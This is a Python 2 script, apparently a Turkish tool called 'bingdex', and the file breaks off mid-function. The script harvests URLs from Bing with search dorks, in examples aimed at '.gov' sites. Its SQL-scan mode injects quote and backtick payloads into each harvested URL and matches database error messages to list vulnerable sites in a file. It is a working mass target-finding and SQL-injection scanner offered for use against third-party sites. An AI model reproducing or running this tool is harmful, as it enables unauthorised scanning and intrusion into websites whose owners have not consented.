# -*- coding: utf-8 -*-
import urllib
import urllib2
import ssl
import argparse
import sys
import socket
import httplib
import os
import re
import requests
import time
import datetime
from urlparse import urlparse
from bs4 import BeautifulSoup
reload(sys) 
sys.setdefaultencoding('utf-8')
os.system('cls' if os.name == 'nt' else 'clear')

class renkler:
	HEADER = '\033[95m'
	mavi = '\033[94m'
	yesil = '\033[92m'
	sari = '\033[93m'
	kirmizi = '\033[91m'
	beyaz = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
print renkler.yesil + """
############################################################################
#                       Cüneyt TANRISEVER                                  #
#                       Bing arama motoru                                  #
# -dork,-dorklistesi,-site,-sitelistesi,-iparama,-iplistesi,               #
# -uzantilar,-sayfa(page),-z(zaman(sleep)),-iplisteolusturucu,             #
# -sqltara,-reversevescript (reverse ip cek script bul(wp,joomla,vb gibi)  #
# bingdex.py -dork -sayfa 3 -z 1 -sqltara -reversevescript                 #
# bingdex.py -dorklistesi dorklar.txt -sayfa 4 -z 2                        #
# bingdex.py -site .gov -sayfa 21 -z 2                                     #
# bingdex.py -site .gov -dork .php?id -sayfa 3 -z 1 -sqltara               #
# bingdex.py -site .gov.br -dorklistesi dorklar.txt -sayfa 11 -z 2         #
# bingdex.py -sitelistesi siteler.txt -dork -sayfa 21 -z 2                 #
# bingdex.py -sitelistesi siteler.txt -dorklistesi dorklar.txt -sayfa 2    #
# bingdex.py -uzantilar uzanti.txt -dork .asp?id -sayfa 21 -z 2            #
# bingdex.py -uzantilar uzanti.txt -dorklistesi dorklar.txt -sayfa 21      #
# bingdex.py -iparama 23.57.31.221 -sayfa 3 -z 1  -sqltara                 #
# bingdex.py -iparama 23.57.31.221 -dork .php?file -sayfa 3 -z 1           #
# bingdex.py -iparama 23.57.31.221 -dorklistesi dorklar.txt -sayfa 3       #
# bingdex.py -iplistesi ipler.txt -dork .php?id -sayfa 3 -z 1              #
# bingdex.py -iplistesi ipler.txt -dorklistesi dorkar.txt -sayfa 3         #
# bingdex.py -iplisteolusturucu (urllistesini verin ip listeye cevirsin)   #
# bingdex.py -dosyaduzeltici liste.txt (ayni linkleri listeden siler)      #
# bingdex.py -ipvedomainreverseip (reverse ip cekip script ayirir)         #
# bingdex.py -ipvedomainreverseip www.gooogle.com                          #
# bingdex.py -ipvedomainreverseip 199.99.9.99                              #
# bingdex.py -scriptleriayir ayrilacak liste.txt yazmaniz yeterlidir.      #
############################################################################"""+renkler.beyaz



parse= argparse.ArgumentParser()
parse.add_argument("-site", "--sitetek", type=str)
parse.add_argument("-scriptleriayir", "--scriptleriayir1", type=str)
parse.add_argument("-sitelistesi", "--sitelist",type=str)
parse.add_argument("-iparama", "--ipara",type=str)
parse.add_argument("-iplistesi", "--iplist",type=str)
parse.add_argument("-iplisteolusturucu", "--iplisteolus",type=str)
parse.add_argument("-dork", "--dorktek",type=str)
parse.add_argument("-dorklistesi", "--dorklist",type=str)
parse.add_argument("-uzantilar", "--uzanti",type=str)
parse.add_argument("-sayfa", "--sayfalar",type=int, default= 1)
parse.add_argument("-z", "--zaman",type=int, default= 0)
parse.add_argument("-reversevescript", "--reversecek", action= "store_true")
parse.add_argument("-sqltara", "--sqltaraa", action= "store_true")
parse.add_argument("-dosyaduzeltici", "--dduzelt",type=str)
parse.add_argument("-ipvedomainreverseip", "--domain",type=str)

args= parse.parse_args()
ipvedomainreverseip=args.domain
site=args.sitetek
scriptleriayir=args.scriptleriayir1
sitelistesi=args.sitelist
iparama=args.ipara
iplistesi=args.iplist
dork=args.dorktek
dorklistesi=args.dorklist
uzantilar=args.uzanti
sayfa=args.sayfalar
zaman = args.zaman
iplisteolusturucu=args.iplisteolus
sqltar=args.sqltaraa
reverse=args.reversecek
dosyaduzeltici=args.dduzelt
print renkler.sari+"Baslama tarih ve zamani = " +time.strftime("%c")+renkler.beyaz
sayicik=0
def gecen(baslangic, bitis):
	sonuc = bitis - baslangic
	d= str(sonuc).split(":")
	dd= d[0]+":"+d[1]+":"+d[2][0:2]
	print renkler.sari+"Program islemi   %s' surede bitirmistir."%(dd)+renkler.beyaz
	
def dduz ():
	kaynak=[]
	karsilastirma=[]
	sonduzen=[]
	dex=open("bing.txt","r").readlines()
	dex2=open("bing.txt","w")
	dex2.close()
	for duzen in dex:
		dzr=duzen.replace("\n","")
		kaynak.append(dzr)
	for i in kaynak:
		karsilastirma.append(i)
	for i in karsilastirma:
		if sonduzen.count(i)==0:
			sonduzen.append(i)
	for i in sonduzen:
		if i.endswith("...")==False:
			bingcom=open("bing.txt","a")
			bingcom.write(i+"\n")
			bingcom.close()
	kaynak=[]
	karsilastirma=[]
	sonduzen=[]
a=1
if a==1:
	
	if site   == None and sqltar == None and sitelistesi ==None and iparama==None and iplistesi==None and dork ==None and dorklistesi ==None and uzantilar == None and iplisteolusturucu == None and dosyaduzeltici==None and ipvedomainreverseip==None:
			print renkler.kirmizi+"Parametresiz Calismaz"+renkler.beyaz
			sys.exit()
	if site   != None and sitelistesi !=None and iparama!=None and iplistesi!=None and dork !=None and dorklistesi !=None and uzantilar != None and iplisteolusturucu != None:
		print renkler.kirmizi+ "Bu parametreler bir arada kullanilmaz"+renkler.beyaz
		sys.exit()
		
	if site and sitelistesi  and iplisteolusturucu and iparama and iplistesi and dork and dorklistesi and uzantilar !=None :
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()

		
	if site and sitelistesi !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if site !=None and uzantilar!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if sitelistesi !=None and uzantilar!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if sitelistesi !=None and iparama!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
		
	if site !=None and iparama!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if uzantilar !=None and iparama!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if uzantilar !=None and iplistesi!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if site !=None and iplistesi!=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if sitelistesi !=None and iplistesi !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and site !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and sitelistesi !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and iparama !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and iplistesi !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and  uzantilar !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and dork !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	if iplisteolusturucu !=None and dorklistesi !=None:
		print renkler.kirmizi+ "bu parametreler bir arada kullanilmaz."+renkler.beyaz
		sys.exit()
	
	kaynak=[]
	karsilastirma=[]
	sonduzen=[]
	if sitelistesi != None and site == None and dorklistesi == None and dork ==None:
		if sayfa ==1:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				time.sleep(zaman)
				
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="site:"+siteli
				print sit
				url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				res=rq.get(url)
				rm=res.content
				soup = BeautifulSoup(rm,'html.parser')
				dex= soup.find_all('h2')
			
				for ia in dex:
					l=ia.find_all('a')
					sokup=BeautifulSoup(str(l),"html.parser")
					for ij in sokup.find_all("a"):
						 p= ij.get('href')
						 print p
						 bingcom=open("bing.txt","a")
						 bingcom.write(p+"\n")
						 bingcom.close()
				bitis= datetime.datetime.now()
				gecen(baslangic,bitis)
				dduz()
				print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="site:"+siteli
				for ig in range (sayfa):
					try:
						time.sleep(zaman)
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						print url
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			sitelist=open(sitelistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				sit="site:"+siteli
				for ig in range (sayfa):
					try:
						syfa=ig * 10+ 1
						pere=ig+1
						time.sleep(zaman)
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if sqltar != False and site   == None and sitelistesi ==None and iparama==None and iplistesi==None and dork ==None and dorklistesi ==None and uzantilar == None and iplisteolusturucu == None and dosyaduzeltici==None and ipvedomainreverseip==None:
		baslangic= datetime.datetime.now()
		print renkler.mavi+"\nSql Taramasi Basladi..."+renkler.beyaz
		dosya=open("sqlaciklisiteler.txt","w")
		dosya.close()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
		rq=requests.session()
		rq.headers.update(headers)

		db = {
		"MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
		"PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
		"Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
		"Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
		"Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
		"IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
		"SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
		"Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
		}
		urlcek=open("bing.txt","r").readlines()
		b=[]
	
		for uy in urlcek:
			yaz3=open("kalansqlsirasi.txt","w")
			yaz3.close()
			yaz3=open("kalansqlsirasi.txt","a")
			yaz3.write(uy)
			yaz3.close
			print "\nDenenen url = ",uy
			urlc=uy.replace("\n","")
			sqlhata = ("'", "'Q", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
			sayicik +=1
			sys.stdout.write('\r')
			sys.stdout.write( str(sayicik)+'. siradaki url deneniyor... ')
			sys.stdout.flush()
			for payd in sqlhata:
				try:
					pk=payd+"&"
					ur=urlc.replace("&",pk)
					url= ur+payd
					res=rq.get(url,timeout=10).content
					for db1, hatalar in db.items():
						for hata in hatalar:
							if re.compile(hata).search(res): 
								print renkler.yesil+"\nsql acikli site = "+renkler.sari+db1+renkler.beyaz+" ", renkler.kirmizi+url+renkler.beyaz
								bingcom=open("sqlaciklisiteler.txt","a")
								bingcom.write(url+"\n")
								bingcom.close()
								b.append("1")
								break
			
						
							else:
								pass
							
				except requests.exceptions.SSLError:
					print "ssl hatasi"
					continue
				except requests.exceptions.ConnectionError:
					sayicik +=1
					print renkler.kirmizi+"\n boyle bir site = %s yok ve ya ban yedin diye baglanmadi"%(urlc) +renkler.beyaz
					continue
				except requests.exceptions.Timeout:
					sayicik +=1
					print renkler.kirmizi+"\nzaman asimi olustu bu url = %s atlandi." %(urlc) +renkler.beyaz
					continue
				except requests.exceptions.TooManyRedirects:
					sayicik +=1
					print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url = %s atlandi"%(urlc)+renkler.beyaz
					continue
				except IOError:
					continue
				except:
					continue
				if b != []:
				   b=[]
				   break
		bingcom=open("sqlaciklisiteler.txt","r").readlines()
		bing=open("sqlaciklisiteler.txt","w")
		bing.close()
		for ks in bingcom:
			df=ks.replace("\n","")
			kaynak.append(df)
		for i in kaynak:
			karsilastirma.append(i)
		for i in karsilastirma:
			if sonduzen.count(i)==0:
				sonduzen.append(i)
		for i in sonduzen:
			bingcom=open("sqlaciklisiteler.txt","a")
			bingcom.write(i+"\n")
			bingcom.close()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		 
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
		print renkler.yesil+"\n------ Sonuclar sqlaciklisiteler.txt kayit edildi ------"+renkler.beyaz
		
		
		
		
		
	if site!=None and sitelistesi==None and dork==None and dorklistesi==None and uzantilar==None and iparama==None :
		
		if sayfa==1:
			
			time.sleep(zaman)
			baslangic= datetime.datetime.now()
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			sit="site:"+site
			url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
			headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
			rq=requests.session()
			rq.headers.update(headers)
			res=rq.get(url)
			rm=res.content
			soup = BeautifulSoup(rm,'html.parser')
			dex= soup.find_all('h2')
	
			for i in dex:
				l=i.find_all('a')
				sokup=BeautifulSoup(str(l),"html.parser")
				for ij in sokup.find_all("a"):
					 p= ij.get('href')
					 print p
					 bingcom=open("bing.txt","a")
					 bingcom.write(p+"\n")
					 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="site:"+site
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="site:"+site
			for i in range (sayfa):
				try:
					time.sleep(zaman)
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if site !=None and dork !=None:
		if sayfa ==1:
			time.sleep(zaman)
			baslangic= datetime.datetime.now()
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			sit="site:"+site+"+"+dork
			url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
			headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
			rq=requests.session()
			rq.headers.update(headers)
			res=rq.get(url)
			rm=res.content
			soup = BeautifulSoup(rm,'html.parser')
			dex= soup.find_all('h2')
			
			for i in dex:
				l=i.find_all('a')
				sokup=BeautifulSoup(str(l),"html.parser")
				for ij in sokup.find_all("a"):
					 p= ij.get('href')
					 print p
					 bingcom=open("bing.txt","a")
					 bingcom.write(p+"\n")
					 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="site:"+site+"+"+dork
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit="site:"+site+"+"+dork
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					time.sleep(zaman)
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if site!=None and dorklistesi!=None:
		if sayfa==1:
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				try:
					drk=i.replace("\n","")
					print renkler.kirmizi+"%s dorku icin %s. sayfa okunuyor veriler cekiliyor."%(drk,sayfa)+renkler.beyaz
				
					sit="site:"+site+"+"+drk
					url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
